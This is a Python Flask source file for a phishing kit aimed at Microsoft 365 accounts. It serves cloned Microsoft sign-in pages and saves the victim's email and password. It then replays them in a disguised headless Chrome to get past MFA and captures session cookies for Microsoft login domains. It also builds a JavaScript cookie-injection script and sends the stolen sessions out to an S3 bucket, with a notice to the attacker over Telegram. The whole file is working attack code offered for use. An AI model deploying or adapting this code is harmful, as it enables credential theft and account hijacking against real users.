import os
import time
import json
import uuid
import boto3
import threading
import requests
from flask import Flask, redirect, request, jsonify
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

port = int(os.environ.get("PORT", 5000))

# === FLASK APP ===
app = Flask(__name__)

# === CONFIG ===
HOME_DIR = os.path.expanduser("~")
BASE_CACHE_PATH = os.path.join(HOME_DIR, "AppData", "Local", "SysRunCache")
os.makedirs(BASE_CACHE_PATH, exist_ok=True)

# Domains to capture and inject cookies for
TARGET_DOMAINS = [
    ".microsoftonline.com",
    ".login.microsoftonline.com",
    ".live.com",
    ".office.com",
    ".outlook.com",
    "m365.cloud.microsoft"
]

# === S3 CONFIG ===
S3_BUCKET = os.getenv("S3_BUCKET")
S3_REGION = os.getenv("S3_REGION", "us-east-1")
S3_ACCESS_KEY = os.getenv("AWS_ACCESS_KEY_ID")
S3_SECRET_KEY = os.getenv("AWS_SECRET_ACCESS_KEY")

# === TELEGRAM CONFIG ===
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# === CHROME SETUP ===
def setup_chrome(profile_path):
    chrome_options = Options()
    chrome_options.add_argument(f"--user-data-dir={profile_path}")
    chrome_options.add_argument("--profile-directory=Default")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-plugins")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_experimental_option("useAutomationExtension", False)
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--headless")
    return chrome_options

# === LOGIN DETECTION ===
def wait_for_login(driver, session_id, timeout=120):
    start = time.time()
    while time.time() - start < timeout:
        url = driver.current_url.lower()
        if any(x in url for x in [
            "login.microsoftonline.com", "login.live.com", "login.windows.net"
        ]):
            time.sleep(2)
            continue
        try:
            driver.find_element("css selector", "div.o365cs-nav-appTile")
            capture_cookies(driver, session_id)
            return True
        except NoSuchElementException:
            pass
        if any(domain in url for domain in [
            "outlook.office.com", "m365.cloud.microsoft", "office.com"
        ]) and not any(x in url for x in [
            "login.microsoftonline.com", "login.live.com", "login.windows.net"
        ]):
            capture_cookies(driver, session_id)
            return True
        time.sleep(2)
    send_telegram_message("❌ Login timeout.")
    return False

# === S3 UPLOAD ===
def upload_to_s3(local_path, s3_key):
    s3 = boto3.client(
        "s3",
        aws_access_key_id=S3_ACCESS_KEY,
        aws_secret_access_key=S3_SECRET_KEY,
        region_name=S3_REGION
    )
    try:
        s3.upload_file(local_path, S3_BUCKET, s3_key)
        return f"https://{S3_BUCKET}.s3.{S3_REGION}.amazonaws.com/{s3_key}"
    except Exception as e:
        print(f"[ERROR] S3 Upload Failed: {e}")
        return None

# === TELEGRAM NOTIFICATION ===
def send_telegram_message(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[WARN] Telegram not configured.")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"[ERROR] Telegram notification failed: {e}")

# === CAPTURE COOKIES + UPLOAD TO S3 ===
def capture_cookies(driver, session_id):
    session_dir = os.path.join(BASE_CACHE_PATH, session_id)
    os.makedirs(session_dir, exist_ok=True)
    all_cookies = driver.get_cookies()
    relevant_cookies = [c for c in all_cookies if any(t in c.get('domain', '') for t in TARGET_DOMAINS)]

    # Save files
    cookie_file = os.path.join(session_dir, "mfa_session_data.json")
    script_file = os.path.join(session_dir, "mfa_inject_all_domains.js")
    with open(cookie_file, "w") as f:
        json.dump(relevant_cookies, f, indent=2)
    generate_injection_script(relevant_cookies, session_dir)

    # Upload to S3
    cookie_url = upload_to_s3(cookie_file, f"sessions/{session_id}/mfa_session_data.json")
    script_url = upload_to_s3(script_file, f"sessions/{session_id}/mfa_inject_all_domains.js")

    # Notify via Telegram
    send_telegram_message(f"✅ Session Captured!\nCookie: {cookie_url}\nScript: {script_url}")

    print(f"[SUCCESS] Session saved: {cookie_url}, {script_url}")

# === GENERATE JS INJECTION SCRIPT ===
def generate_injection_script(cookies, session_dir):
    cookies_by_domain = {}
    for cookie in cookies:
        dom = cookie['domain'].lstrip('.')
        if dom not in cookies_by_domain:
            cookies_by_domain[dom] = []
        cookies_by_domain[dom].append(cookie)

    js_lines = [
        "console.log('Injecting Office 365 session cookies...');",
        "function setCookie(name, value, domain, path, secure, sameSite) {",
        "  let cookieStr = `${name}=${value}; path=${path || '/'}; domain=.${domain}; Max-Age=31536000;`;",
        "  if (secure) cookieStr += ' Secure;';",
        "  if (sameSite && sameSite !== 'None') cookieStr += ` SameSite=${sameSite};`;",
        "  document.cookie = cookieStr;",
        "}",
    ]
    for domain, domain_cookies in cookies_by_domain.items():
        js_lines.append(f"// --- Cookies for .{domain} ---")
        for c in domain_cookies:
            name = c['name'].replace("'", "\\'")
            value = c['value'].replace("'", "\\'")
            path = c.get('path', '/').replace("'", "\\'")
            secure = str(c.get('secure', False)).lower()
            sameSite = c.get('sameSite', 'None')
            js_lines.append(
                f"setCookie('{name}', '{value}', '{domain}', '{path}', {secure}, '{sameSite}');"
            )
    js_lines.append("console.log('All cookies injected. Redirecting...');")
    js_lines.append("setTimeout(() => window.location.href = 'https://m365.cloud.microsoft/?auth=1', 2000);")
    with open(os.path.join(session_dir, "mfa_inject_all_domains.js"), "w") as f:
        f.write("\n".join(js_lines))

# === AUTO-LOGIN WITH DYNAMIC MFA DETECTION ===
def auto_login_dynamic_mfa(email, password, otp, totp, session_id):
    try:
        profile_path = os.path.join(BASE_CACHE_PATH, f"profile_{uuid.uuid4()}")
        os.makedirs(profile_path, exist_ok=True)
        chrome_options = setup_chrome(profile_path)
        driver = webdriver.Chrome(options=chrome_options)
        driver.get("https://login.microsoftonline.com")

        # Step 1: Email
        time.sleep(3)
        driver.find_element("css selector", "input[type='email']").send_keys(email)
        driver.find_element("css selector", "input[type='submit']").click()

        # Step 2: Password
        time.sleep(5)
        driver.find_element("css selector", "input[type='password']").send_keys(password)
        driver.find_element("css selector", "input[type='submit']").click()

        # Step 3: Wait for MFA or redirect
        time.sleep(5)
        try:
            # Check if MFA is required
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[name='otc'], input[name='authenticatorCode']"))
            )
            # MFA detected
            if otp:
                driver.find_element("css selector", "input[name='otc']").send_keys(otp)
            elif totp:
                driver.find_element("css selector", "input[name='authenticatorCode']").send_keys(totp)
            driver.find_element("css selector", "input[type='submit']").click()
        except TimeoutException:
            # No MFA, proceed
            pass

        # Wait for login to complete
        wait_for_login(driver, session_id)
    except Exception as e:
        send_telegram_message(f"❌ Auto-login failed: {e}")
        print(f"[ERROR] {e}")
    finally:
        try:
            driver.quit()
        except:
            pass

# === ULTRA-REALISTIC FAKE MICROSOFT LOGIN PAGE ===
@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Sign in to your Microsoft account</title>
        <link rel="icon" href="https://login.microsoftonline.com/favicon.ico">
        <style>
            body {
                font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
                background-color: #f5f5f5;
                text-align: center;
                padding-top: 50px;
            }
            .login-box {
                background: white;
                width: 360px;
                margin: auto;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            input {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 4px;
            }
            button {
                width: 100%;
                padding: 12px;
                background: #0067b8;
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 16px;
            }
            .logo {
                width: 100px;
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" class="logo">
            <h2>Sign in</h2>
            <form action="/password" method="post">
                <input type="email" name="email" placeholder="Email, phone, or Skype" required><br>
                <button type="submit">Next</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/password', methods=['POST'])
def password_page():
    email = request.form['email']
    session_id = f"session_{int(time.time())}"
    with open(os.path.join(BASE_CACHE_PATH, f"{session_id}_email.txt"), "w") as f:
        f.write(email)
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Sign in to your Microsoft account</title>
        <link rel="icon" href="https://login.microsoftonline.com/favicon.ico">
        <style>
            body {{
                font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
                background-color: #f5f5f5;
                text-align: center;
                padding-top: 50px;
            }}
            .login-box {{
                background: white;
                width: 360px;
                margin: auto;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }}
            input {{
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                border: 1px solid #ccc;
                border-radius: 4px;
            }}
            button {{
                width: 100%;
                padding: 12px;
                background: #0067b8;
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 16px;
            }}
            .logo {{
                width: 100px;
                margin-bottom: 20px;
            }}
        </style>
    </head>
    <body>
        <div class="login-box">
            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" class="logo">
            <h2>Enter password</h2>
            <form action="/mfa_check" method="post">
                <input type="hidden" name="session_id" value="{session_id}">
                <input type="password" name="password" placeholder="Password" required><br>
                <button type="submit">Sign in</button>
            </form>
        </div>
    </body>
    </html>
    '''

@app.route('/mfa_check', methods=['POST'])
def mfa_check():
    session_id = request.form['session_id']
    password = request.form['password']
    creds_file = os.path.join(BASE_CACHE_PATH, f"{session_id}_creds.json")
    with open(creds_file, "w") as f:
        json.dump({"password": password}, f)

    # Start auto-login to check for MFA
    email_file = os.path.join(BASE_CACHE_PATH, f"{session_id}_email.txt")
    with open(email_file, "r") as f:
        email = f.read().strip()

    thread = threading.Thread(target=auto_login_dynamic_mfa, args=(email, password, None, None, session_id))
    thread.start()

    return '''
    <html>
        <head>
            <title>Verifying your account</title>
            <style>
                body { font-family: "Segoe UI", sans-serif; text-align: center; padding-top: 100px; }
            </style>
        </head>
        <body>
            <h2>Verifying your account...</h2>
            <img src="https://i.gifer.com/ZZ5H.gif" width="50">
            <p>You may close this window.</p>
        </body>
    </html>
    '''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=port)
